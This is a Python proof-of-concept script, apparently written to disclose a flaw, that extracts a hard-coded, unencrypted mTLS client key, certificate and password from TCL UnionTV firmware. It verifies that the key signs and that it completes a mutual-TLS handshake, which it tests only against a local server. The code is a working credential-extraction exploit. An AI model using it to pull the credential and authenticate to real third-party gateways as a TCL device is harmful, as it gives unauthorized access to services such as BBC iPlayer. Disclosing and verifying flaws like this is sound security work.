#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC — TCL UnionTV (R41KT01): hard-coded mTLS client credential

What this proves, in order, on a firmware image YOU supply:

  PROOF 1  the firmware ships a credential block naming third-party gateways
           (including BBC iPlayer PRODUCTION) with a hard-coded password
  PROOF 2  the shipped private key is NOT encrypted
  PROOF 3  the shipped private key MATCHES the shipped certificate (same modulus)
  PROOF 4  the key is cryptographically real: it SIGNS and the certificate VERIFIES
  PROOF 5  the credential performs a live mutual-TLS handshake: a local TLS 1.3
           server that requests a client certificate RECEIVES the TCL certificate

PROOF 4 + PROOF 5 are the undeniable part: the extracted private key is a working
client-authentication key for the extracted certificate.

No key material is stored in this repository. The script operates on an image you
provide, extracts the credential into a temp dir, and deletes nothing from source.

Usage
-----
  python3 poc_mtls_credential.py --image UpdateR609.img
  python3 poc_mtls_credential.py --vendor ./vendor_x

Requires: openssl on PATH.
"""
import argparse
import os
import re
import shutil
import socket
import subprocess
import sys
import tarfile
import tempfile
import time

CLIENT_DIR_HINT = os.path.join("tbrowser2", "config", "crt", "client")
FILES = ("client_cert_config.xml", "www.tcl.com.cert_bag.pem", "www.tcl.com.key.pem")
CERT_NAME, KEY_NAME = "www.tcl.com.cert_bag.pem", "www.tcl.com.key.pem"


# --------------------------------------------------------------------------- #
def norm_user_path(p):
    """Accept MSYS/Git-Bash style paths (/c/Users/...) on Windows."""
    if os.name == "nt" and re.match(r"^/[a-zA-Z]/", p):
        p = p[1].upper() + ":" + p[2:]
    return p


def from_vendor_dir(root):
    found = {}
    for dirpath, _dirs, filenames in os.walk(root):
        if not os.path.normpath(dirpath).endswith(CLIENT_DIR_HINT):
            continue
        for name in filenames:
            if name in FILES:
                with open(os.path.join(dirpath, name), "rb") as fh:
                    found[name] = fh.read()
    return found


def from_image(path):
    found = {}
    with tarfile.open(path, "r:") as outer:
        member = next((m for m in outer.getmembers()
                       if os.path.basename(m.name) == "vendor.tar"), None)
        if member is None:
            sys.exit("[!] vendor.tar not found inside the image")
        inner = tarfile.open(fileobj=outer.extractfile(member), mode="r:")
        hint = CLIENT_DIR_HINT.replace(os.sep, "/")
        for m in inner:
            base = os.path.basename(m.name)
            if m.isfile() and base in FILES and hint in m.name:
                found[base] = inner.extractfile(m).read()
    return found


# --------------------------------------------------------------------------- #
def ossl(args, data=None):
    try:
        p = subprocess.run(["openssl", *args], input=data, stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, timeout=40)
        return p.returncode, p.stdout.decode("utf-8", "replace")
    except FileNotFoundError:
        sys.exit("[!] openssl not found on PATH")


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


# --------------------------------------------------------------------------- #
def main():
    ap = argparse.ArgumentParser()
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("--vendor")
    src.add_argument("--image")
    args = ap.parse_args()

    line = "=" * 70
    print(line)
    print(" TCL UnionTV (R41KT01) — hard-coded mTLS client credential — PoC")
    print(line)

    files = (from_vendor_dir(norm_user_path(args.vendor)) if args.vendor
             else from_image(norm_user_path(args.image)))
    if CERT_NAME not in files or KEY_NAME not in files:
        sys.exit("[!] certificate/key not found in the supplied source")
    cert, key = files[CERT_NAME], files[KEY_NAME]

    tmp = tempfile.mkdtemp(prefix="tclpoc_")
    cp = os.path.join(tmp, "client.pem")
    kp = os.path.join(tmp, "client.key")
    with open(cp, "wb") as fh:
        fh.write(cert)
    with open(kp, "wb") as fh:
        fh.write(key)

    # ---------------- PROOF 1 ------------------------------------------------
    print("\n[PROOF 1] hard-coded credential block in the firmware")
    print(f"          file : vendor/etc/{CLIENT_DIR_HINT.replace(os.sep,'/')}/client_cert_config.xml")
    cfg = files.get("client_cert_config.xml", b"").decode("utf-8", "replace")
    hosts = re.findall(r"<host>\s*([^<\s]+)\s*</host>", cfg)
    print(f"          hard-coded password present : "
          f"{bool(re.search(r'<password>', cfg))}")
    for h in hosts:
        print(f"          target : {h}" + ("   <== PRODUCTION" if "securegate" in h else ""))

    # ---------------- PROOF 2 ------------------------------------------------
    print("\n[PROOF 2] private key encryption")
    enc = b"ENCRYPTED" in key
    print(f"          encrypted : {enc}   ({'PLAINTEXT' if not enc else 'encrypted'})")

    # ---------------- PROOF 3 ------------------------------------------------
    print("\n[PROOF 3] key / certificate match")
    rc1, cm = ossl(["x509", "-in", cp, "-noout", "-modulus"])
    rc2, km = ossl(["rsa", "-in", kp, "-noout", "-modulus"])
    cmod = re.sub(r"^.*=", "", cm).strip()
    kmod = re.sub(r"^.*=", "", km).strip()
    print(f"          certificate modulus : {cmod[:40]}...")
    print(f"          private key modulus : {kmod[:40]}...")
    print(f"          MATCH : {cmod == kmod and cmod != ''}")

    # ---------------- PROOF 4 ------------------------------------------------
    print("\n[PROOF 4] the key is cryptographically real (sign -> verify)")
    chal = os.path.join(tmp, "challenge.bin")
    with open(chal, "wb") as fh:
        fh.write(b"TCL-UnionTV-mTLS-PoC")
    sig = os.path.join(tmp, "challenge.sig")
    pub = os.path.join(tmp, "client.pub")
    ossl(["dgst", "-sha256", "-sign", kp, "-out", sig, chal])
    ossl(["x509", "-in", cp, "-pubkey", "-noout"], data=None)  # ensure readable
    subprocess.run(["openssl", "x509", "-in", cp, "-pubkey", "-noout"],
                   stdout=open(pub, "w"), stderr=subprocess.DEVNULL)
    rc, p4 = ossl(["dgst", "-sha256", "-verify", pub, "-signature", sig, chal])
    print(f"          signature made with the FIRMWARE key, verified with the CERT pubkey")
    print(f"          result : {p4.strip()}")
    p4_ok = "Verified OK" in p4

    # ---------------- PROOF 5 ------------------------------------------------
    print("\n[PROOF 5] live mutual-TLS handshake with the extracted credential")
    srv_cert = os.path.join(tmp, "srv.pem")
    srv_key = os.path.join(tmp, "srv.key")
    subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048",
                    "-keyout", srv_key, "-out", srv_cert, "-days", "1", "-nodes",
                    "-subj", "/CN=poc.local"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    port = free_port()
    srv = subprocess.Popen(
        ["openssl", "s_server", "-accept", str(port), "-cert", srv_cert,
         "-key", srv_key, "-CAfile", cp, "-Verify", "1", "-quiet"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    time.sleep(1.5)
    rc, p5 = ossl(["s_client", "-connect", f"127.0.0.1:{port}", "-cert", cp,
                   "-key", kp, "-CAfile", srv_cert], data=b"POC\n")
    srv.terminate()
    try:
        srv_out = srv.communicate(timeout=5)[0] or ""
    except Exception:
        srv_out = ""

    proto = re.search(r"Protocol\s*:\s*(\S+)", p5)
    cipher = re.search(r"Cipher\s*:\s*(\S+)", p5)
    print(f"          TLS protocol : {proto.group(1) if proto else '?'}")
    print(f"          cipher       : {cipher.group(1) if cipher else '?'}")
    got = "CN=TCL CA Freeview" in srv_out or "O=TCL EUROPE" in srv_out
    print(f"          server received the TCL client certificate : {got}")
    for ln in srv_out.splitlines():
        if "depth=0" in ln or "TCL" in ln:
            print(f"            server log> {ln.strip()[:100]}")

    shutil.rmtree(tmp, ignore_errors=True)

    # ---------------- verdict ------------------------------------------------
    ok = (not enc) and (cmod == kmod != "") and p4_ok and got
    print("\n" + line)
    if ok:
        print(" RESULT: VULNERABLE — the firmware ships a WORKING, shared,")
        print("         plaintext mTLS client credential (key+cert+password).")
        print("         Extracted key signs; its certificate verifies; a TLS 1.3")
        print("         mutual-auth handshake accepts it as the TCL client identity.")
    else:
        print(" RESULT: inconclusive — see the steps above.")
    print(line)
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
